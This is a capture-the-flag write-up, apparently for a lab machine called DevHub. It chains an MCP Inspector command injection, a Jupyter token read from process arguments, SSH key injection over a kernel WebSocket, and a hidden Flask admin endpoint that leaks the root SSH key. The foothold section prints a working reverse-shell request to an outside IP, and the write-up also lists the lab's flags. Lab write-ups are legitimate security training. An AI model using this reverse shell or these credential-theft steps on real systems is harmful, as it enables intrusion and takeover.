# Summary

DevHub exposes multiple developer services including MCP Inspector and Jupyter Lab. Initial access was obtained through a command injection vulnerability in MCP Inspector. After discovering an internal Jupyter token, a custom WebSocket payload was used to gain access to the analyst account. Further enumeration revealed a hidden administrative function in an internal Flask application, which exposed the root SSH private key and led to full system compromise.

---

## Attack Path

| Step | Technique | Result |
|--------|----------|----------|
| 1 | MCP Inspector RCE | Initial shell as `mcp-dev` |
| 2 | Jupyter Token Leakage | Discovered analyst Jupyter token |
| 3 | WebSocket Code Execution | Added SSH key for analyst |
| 4 | Hidden Admin Function | Retrieved root SSH private key |
| 5 | SSH Authentication | Root access obtained |

---

# Reconnaissance

## Port Scan

```bash
nmap -p- -sC -sV 10.129.3.57 -oA 10.129.3.57
```

### Scan Result

```text
<insert nmap output here>
```

| Port | State | Service | Version |
|----------|----------|----------|----------|
| 22/tcp | open | ssh | OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 |
| 80/tcp | open | http | nginx 1.18.0 (Ubuntu) |
| 6274/tcp | open | unknown | unknown |

---

## Environment Setup

The web application redirects users to the local domain `devhub.htb`. To access the site correctly, add the domain to the local hosts file.

```bash
echo "10.129.3.57 devhub.htb" | sudo tee -a /etc/hosts
```

```text
10.129.3.57 devhub.htb
```

---

# Foothold

## MCP Inspector RCE

Port 6274 hosts an MCP Inspector service. The `/api/mcp/connect` endpoint accepts user-controlled commands, allowing remote command execution.

### Start a Listener

```bash
nc -lvnp 4444
```

### Trigger Reverse Shell

```bash
curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{"serverConfig": {"command": "bash", "args": ["-c", "bash -i >& /dev/tcp/10.10.15.65/4444 0>&1"], "env": {}}, "serverId": "shell3"}'
```

```text
{"success":false,"error":"Connection failed for server shell3: MCP error -32001: Request timed out","details":"MCP error -32001: Request timed out"}
```

A reverse shell connection is received as the `mcp-dev` user.

```bash
nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.10.15.65] from (UNKNOWN) [10.129.3.57] 53184

mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ whoami
mcp-dev
```

### Upgrade TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

# Lateral Movement

## Discover Internal Jupyter Service

Enumerate running processes and identify an internal Jupyter Lab instance.

```bash
ps aux | grep jupyter
```

The process arguments reveal a valid authentication token.

```text
analyst     1100  ... jupyter-lab ...
--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

#### Token

```text
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

## Create a New Kernel

```bash
curl -s -X POST \
"http://localhost:8888/api/kernels?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
-H "Content-Type: application/json" \
-d '{}'
```

The request returns a kernel ID.

```json
{
  "id": "efeaea2d-c81e-4991-afb5-66c9af19fe72",
  "name": "python3"
}
```

#### Kernel ID

```text
efeaea2d-c81e-4991-afb5-66c9af19fe72
```

## Analyst Access via Jupyter Kernel

A valid Jupyter authentication token was discovered in the running process list. After creating a new kernel, direct code execution was achieved by manually crafting WebSocket frames and interacting with the kernel channel.

Since external Python modules were unavailable, a custom Python script was written to communicate directly with the WebSocket endpoint and append an SSH public key to the analyst user's authorized keys.

```python
<insert websocket payload script here>
```

### Execute Payload

```bash
python3 /tmp/pwn.py
```

```text
[+] SSH Key Injection payload dispatched!
```

### SSH as analyst

```bash
ssh analyst@devhub.htb
```

Successful login confirms access to the analyst account.

```text
Welcome to Ubuntu 22.04.5 LTS
...
analyst@devhub:~$
```

### User Flag

```bash
cat /home/analyst/user.txt
```

```text
9cfd5dc906d5b588b7859424e6e0421a
```

---

# Privilege Escalation

## Internal Service Enumeration

Further enumeration revealed an internal Flask application running as root on port 5000.

```bash
cat /opt/opsmcp/server.py
```

Reviewing the source code identified:

- A hardcoded API key
- A hidden administrative function named `ops._admin_dump`
- Functionality capable of exposing sensitive system files

The following code snippet shows the hidden functionality responsible for returning the root SSH private key.

```python
opsmcp_secret_key_4f5a6b7c8d9e0f1a

elif tool_name == "ops._admin_dump":
    target = args.get('target', '')
    confirm = args.get('confirm', False)

    if target == "ssh_keys":
        with open('/root/.ssh/id_rsa', 'r') as f:
            key_data = f.read()
```

### Dump Root SSH Key

```bash
curl -s -X POST "http://localhost:5000/tools/call" \
-H "Content-Type: application/json" \
-H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
-d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

The endpoint returns the root user's private SSH key.

### SSH as root

Save the key locally and set the correct permissions.

```bash
chmod 600 root_key
ssh -i root_key root@10.129.3.57
```

A root shell is obtained.

```text
root@devhub:~#
```

### Root Flag

```bash
cat /root/root.txt
```

```text
f08364d99ace8798681925311bf24d78
```

---

# Flags

| Flag | Value |
|----------|----------|
| User | 9cfd5dc906d5b588b7859424e6e0421a |
| Root | f08364d99ace8798681925311bf24d78 |

---

# Vulnerability Summary

| Stage | Vulnerability | Impact |
|---------|--------------|---------|
| Initial Access | CVE-2026-23744 (MCP Inspector RCE) | Remote Code Execution as `mcp-dev` |
| Lateral Movement | Exposed Jupyter Authentication Token | Access to Jupyter Kernel |
| Lateral Movement | Jupyter Kernel WebSocket Execution | SSH Key Injection as analyst |
| Privilege Escalation | Hidden `ops._admin_dump` Function | Disclosure of Root SSH Private Key |
| Privilege Escalation | Hardcoded API Key | Unauthorized Administrative Access |
| Impact | Root SSH Authentication | Full System Compromise |